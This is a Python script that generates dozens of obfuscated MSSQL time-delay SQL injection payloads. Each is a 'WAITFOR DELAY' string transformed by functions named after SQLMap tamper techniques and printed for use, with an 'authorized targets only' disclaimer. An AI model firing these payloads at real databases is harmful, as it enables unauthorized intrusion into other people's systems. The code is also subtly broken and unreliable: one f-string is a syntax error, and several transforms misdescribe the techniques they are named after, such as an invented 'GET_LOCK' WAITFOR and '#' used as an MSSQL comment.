# MSSQL "sleep 5s" payload generator with full SQLMap tamper coverage
# Generates payloads for all major SQLMap tamper types, obfuscated and ready for testing on authorized targets only

import urllib.parse
import base64
import random

base = "'; WAITFOR DELAY '00:00:05'--"

def url_encoded(s):
    return urllib.parse.quote_plus(s)

def mixed_case_spaces(s):
    out = []
    for c in s:
        out.append(c.upper() if random.choice([True, False]) else c.lower())
    return ''.join(out).replace('WAITFOR', 'WAiTfOr   ').replace('DELAY', 'DeLaY ')

def comment_before_parentheses(s):
    return s.replace('(', '/**/(')

def plus2concat(s):
    return s.replace('+', '||')

def plus2fnconcat(s):
    return s.replace('+', 'fn+' )

def random_comments(s):
    out = []
    for c in s:
        out.append(c + '/**/' if c.isalpha() else c)
    return ''.join(out)

def char_double_encode(s):
    return ''.join([f'%{ord(c):02x}%{ord(c):02x}' for c in s])

def charencode(s):
    return '+'.join([f'CHAR({ord(c)})' for c in s])

def charunicodeencode(s):
    return '+'.join([f'NCHAR({ord(c)})' for c in s])

def charunicodeescape(s):
    return ''.join([f'\u{ord(c):04x}' for c in s])

def apostrophe_mask(s):
    return s.replace("'", '"')

def apostrophenullencode(s):
    return s.replace("'", "'+CHAR(0)+'")

def append_nullbyte(s):
    return s + '\x00'

def base64_encode(s):
    return base64.b64encode(s.encode()).decode()

def lowercase(s):
    return s.lower()

def uppercase(s):
    return s.upper()

def random_case(s):
    return ''.join([c.upper() if random.choice([True, False]) else c.lower() for c in s])

def space2comment(s):
    return s.replace(' ', '/**/')

def space2dash(s):
    return s.replace(' ', '--')

def space2hash(s):
    return s.replace(' ', '#')

def space2morecomment(s):
    return s.replace(' ', '/**//**/')

def space2morehash(s):
    return s.replace(' ', '##')

def space2mssqlblank(s):
    return s.replace(' ', '')

def space2mssqlhash(s):
    return s.replace(' ', '#')

def space2mysqlblank(s):
    return s.replace(' ', '')

def space2mysqldash(s):
    return s.replace(' ', '--')

def space2plus(s):
    return s.replace(' ', '+')

def space2randomblank(s):
    return ''.join([ch if ch != ' ' else random.choice(['', ' ']) for ch in s])

def sleep2getlock(s):
    return s.replace('WAITFOR DELAY', 'WAITFOR GET_LOCK')

def unionalltounion(s):
    return s.replace('UNION ALL', 'UNION')

def unmagicquotes(s):
    return s.replace("\\'", "'")

def d_union(s):
    return s.replace('UNION', 'DUNION')

variants = [
    base,
    url_encoded(base),
    mixed_case_spaces(base),
    comment_before_parentheses(base),
    plus2concat(base),
    plus2fnconcat(base),
    random_comments(base),
    char_double_encode(base),
    charencode(base),
    charunicodeencode(base),
    charunicodeescape(base),
    apostrophe_mask(base),
    apostrophenullencode(base),
    append_nullbyte(base),
    base64_encode(base),
    lowercase(base),
    uppercase(base),
    random_case(base),
    space2comment(base),
    space2dash(base),
    space2hash(base),
    space2morecomment(base),
    space2morehash(base),
    space2mssqlblank(base),
    space2mssqlhash(base),
    space2mysqlblank(base),
    space2mysqldash(base),
    space2plus(base),
    space2randomblank(base),
    sleep2getlock(base),
    unionalltounion(base),
    unmagicquotes(base),
    d_union(base)
]

if __name__ == '__main__':
    for i, payload in enumerate(variants, 1):
        print(f"[payload_{i}]\n{payload}\n")

    print("[base64_plain]\n" + base64.b64encode(base.encode()).decode())
